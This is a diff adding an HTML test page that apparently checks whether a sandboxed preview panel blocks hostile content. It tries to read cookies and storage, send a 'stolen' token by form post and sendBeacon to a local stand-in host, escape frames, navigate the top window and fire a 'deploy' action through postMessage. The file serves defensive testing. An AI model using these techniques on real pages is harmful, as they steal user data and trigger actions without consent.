@@ -1,0 +1,96 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta http-equiv="refresh" content="0;url=http://127.0.0.1:4400/refresh">
+<title>Every forbidden thing</title>
+<script>window.refused = []; addEventListener("securitypolicyviolation", e => refused.push(`${e.effectiveDirective} ${e.blockedURI}`));</script>
+<link rel="stylesheet" href="http://127.0.0.1:4400/sheet.css">
+<link rel="prefetch" href="http://127.0.0.1:4400/prefetch">
+<script src="http://127.0.0.1:4400/remote.js"></script>
+<style>
+  @font-face { font-family: far; src: url(http://127.0.0.1:4400/font.woff2); }
+  body { font: 11px/1.55 var(--font-mono); color: var(--foreground); }
+  form, iframe, img { display: none; }
+  h1 { font: 500 13px var(--font-sans); margin: 0 0 8px; }
+  ol { margin: 0; padding-left: 26px; }
+  .blocked { color: var(--muted-foreground); }
+  .blocked b { color: var(--success-foreground); font-weight: 500; }
+  .reached b { color: var(--error-foreground); font-weight: 600; }
+  .far { font-family: far, var(--font-mono); margin: 10px 0 0; }
+</style>
+</head>
+<body>
+<h1>This page tries every forbidden thing</h1>
+<img src="http://127.0.0.1:4400/pixel.png" alt="" width="1" height="1">
+<img src="https://images.acme.test/outside.png" alt="" width="1" height="1">
+<iframe src="http://127.0.0.1:4400/framed"></iframe>
+<iframe srcdoc="<script>parent.postMessage('nested static page ran', '*')</script>"></iframe>
+<div><template shadowrootmode="open"><iframe srcdoc="<script>new RTCPeerConnection()</script>"></iframe></template></div>
+<form id="post" method="post" action="http://127.0.0.1:4400/form"><input name="token" value="stolen"></form>
+<ol id="log"></ol>
+<p class="far" id="done"></p>
+<script>
+  const TARGET = "127.0.0.1:4400";
+  const STUN = "stun:127.0.0.1:3478";
+  const log = document.getElementById("log");
+  const said = [];
+  const line = (name, reached, detail) => {
+    said.push({ name, reached, detail });
+    const li = document.createElement("li");
+    li.className = reached ? "reached" : "blocked";
+    li.dataset.attempt = name;
+    li.dataset.outcome = reached ? "reached" : "blocked";
+    const b = document.createElement("b");
+    b.textContent = reached ? "reached" : "blocked";
+    li.append(`${name}: `, b, ` ${detail}`);
+    log.append(li);
+  };
+  const nested = [];
+  addEventListener("message", e => nested.push(String(e.data)));
+  const tryIt = async (name, act) => {
+    try {
+      const got = await act();
+      line(name, got.reached, got.detail);
+    } catch (e) {
+      line(name, false, e.name === "Error" ? e.message : e.name);
+    }
+  };
+  const after = ms => new Promise(r => setTimeout(r, ms));
+  const policyLine = what => () => {
+    const hit = refused.filter(r => r.includes(what));
+    return { reached: false, detail: hit.length > 0 ? `by the policy (${hit[0].split(" ")[0]})` : "never asked for" };
+  };
+
+  (async () => {
+    await after(300);
+    await tryIt(`fetch to ${TARGET}`, async () => ({ reached: true, detail: `status ${(await fetch(`http://${TARGET}/fetch`)).status}` }));
+    await tryIt("WebSocket", () => new Promise((ok, no) => { const w = new WebSocket(`ws://${TARGET}/socket`); w.onopen = () => ok({ reached: true, detail: "open" }); w.onerror = () => no(new Error("no connection")); }));
+    await tryIt("window.top", async () => ({ reached: true, detail: window.top.location.href }));
+    await tryIt("the app's document", async () => ({ reached: true, detail: window.parent.parent.document.title }));
+    await tryIt("localStorage", async () => ({ reached: true, detail: `${localStorage.length} keys` }));
+    await tryIt("cookies", async () => ({ reached: true, detail: document.cookie || "empty jar" }));
+    await tryIt("IndexedDB", () => new Promise((ok, no) => { const r = indexedDB.open("x"); r.onsuccess = () => ok({ reached: true, detail: "opened" }); r.onerror = () => no(r.error); }));
+    await tryIt("form post", async () => { document.getElementById("post").submit(); await after(400); return { reached: false, detail: "the page is still here, nothing was sent" }; });
+    await tryIt("outside image", policyLine("pixel.png"));
+    await tryIt("remote script", async () => ({ reached: typeof window.remoteRan !== "undefined", detail: refused.some(r => r.includes("remote.js")) ? "by the policy (script-src)" : "never ran" }));
+    await tryIt("remote stylesheet", policyLine("sheet.css"));
+    await tryIt("remote font", async () => { document.getElementById("done").textContent = "font"; await document.fonts.ready; await after(200); return policyLine("font.woff2")(); });
+    await tryIt("sendBeacon", async () => { navigator.sendBeacon(`http://${TARGET}/beacon`, "stolen"); await after(100); return policyLine("beacon")(); });
+    await tryIt("EventSource", () => new Promise((ok, no) => { const s = new EventSource(`http://${TARGET}/events`); s.onopen = () => ok({ reached: true, detail: "open" }); s.onerror = () => { s.close(); no(new Error("no connection")); }; }));
+    await tryIt("popup", async () => { const w = window.open(`http://${TARGET}/popup`); if (w === null) throw new Error("no window"); return { reached: true, detail: "a window opened" }; });
+    await tryIt("top navigation", async () => { window.top.location = `http://${TARGET}/top`; return { reached: true, detail: "set" }; });
+    await tryIt("WebRTC to a STUN server", async () => { const pc = new RTCPeerConnection({ iceServers: [{ urls: STUN }] }); pc.createDataChannel("x"); await pc.setLocalDescription(await pc.createOffer()); return { reached: true, detail: "offer made" }; });
+    await tryIt("a nested page, written", async () => { const d = document.createElement("div"); d.innerHTML = `<iframe srcdoc="<script>parent.postMessage('nested written page ran', '*')<\/script>"></iframe>`; document.body.append(d); await after(400); return { reached: nested.some(n => n.includes("written")), detail: d.querySelector("iframe") === null ? "its frame was cut" : "frame kept" }; });
+    await tryIt("a nested page, set as srcdoc", async () => { const f = document.createElement("iframe"); f.srcdoc = `<script>parent.postMessage('nested srcdoc page ran', '*')<\/script>`; document.body.append(f); await after(400); return { reached: nested.some(n => n.includes("srcdoc")), detail: f.isConnected ? "frame kept" : "its frame was cut" }; });
+    await tryIt("a javascript: frame", async () => { const f = document.createElement("iframe"); f.setAttribute("src", "javascript:parent.postMessage('javascript frame ran','*')"); document.body.append(f); await after(400); return { reached: nested.some(n => n.includes("javascript")), detail: "it never ran" }; });
+    await tryIt("XSLT", async () => ({ reached: true, detail: String(new XSLTProcessor()) }));
+    await tryIt("the static nested pages", async () => ({ reached: nested.some(n => n.includes("static")), detail: document.querySelectorAll("iframe").length === 0 ? "cut before the page drew" : "frames kept" }));
+    await tryIt("Node", async () => ({ reached: true, detail: typeof require("fs") }));
+    await tryIt("a slate action", async () => { window.top.postMessage({ wspFrame: "event", piece: "deploy", event: "press" }, "*"); window.parent.postMessage({ wspFrame: "height", height: 99999 }, "*"); return { reached: false, detail: "sent; the panel takes a height and nothing else" }; });
+    document.body.dataset.done = "1";
+    document.getElementById("done").textContent = `${said.filter(s => s.reached).length} of ${said.length} reached`;
+  })();
+</script>
+</body>
+</html>
